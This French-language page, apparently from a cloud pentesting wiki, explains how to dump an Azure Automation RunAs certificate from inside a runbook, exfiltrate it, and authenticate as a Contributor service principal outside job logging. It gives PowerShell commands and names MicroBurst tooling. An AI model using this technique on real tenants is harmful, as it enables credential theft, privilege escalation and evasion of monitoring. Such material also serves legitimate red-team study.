---
title: "Compte RunAs : agir en tant que service principal Automation"
order: 2
description: "Détourner le compte RunAs d'Automation et son certificat pour agir en tant que service principal privilégié."
keywords:
  - RunAs account
  - certificate
  - service principal
  - Automation
  - privilege escalation
---

# Compte RunAs

Un **compte RunAs** Automation hérité est un service principal doté d'un certificat stocké dans le compte, généralement avec le rôle Contributor sur l'abonnement. Exporter le certificat depuis l'intérieur d'un runbook permet de s'authentifier en tant que ce service principal depuis n'importe où, en dehors du bac à sable Automation et en dehors de la journalisation du compte.

## Exporter le certificat RunAs

```powershell
# inside a runbook, dump the RunAs connection certificate
$conn = Get-AutomationConnection -Name 'AzureRunAsConnection'
$cert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'
# export the PFX bytes and exfiltrate; then authenticate from your host:
Connect-AzAccount -ServicePrincipal -Tenant $conn.TenantId `
  -ApplicationId $conn.ApplicationId -CertificateThumbprint $conn.CertificateThumbprint
```

## Notes d'exploitation

- Les comptes RunAs sont déconseillés au profit des identités managées, mais subsistent dans de nombreux tenants ; là où ils sont présents, le service principal est généralement Contributor et son certificat a une longue durée de vie.
- L'authentification avec le certificat exporté se déroule en dehors de la plateforme Automation : elle échappe donc entièrement à la journalisation des jobs de runbook.
- MicroBurst `Get-AzRunAsCertificate` automatise l'export.

## Outils

- **Az PowerShell** (`Get-AutomationCertificate`, `Connect-AzAccount -ServicePrincipal`).
- **MicroBurst** (`Get-AzRunAsCertificate`, `Get-AzPasswords`).

## Références

- [NetSPI: MicroBurst (RunAs certificate extraction)](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud: Azure Automation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: Automation RunAs accounts](https://learn.microsoft.com/azure/automation/automation-security-overview)
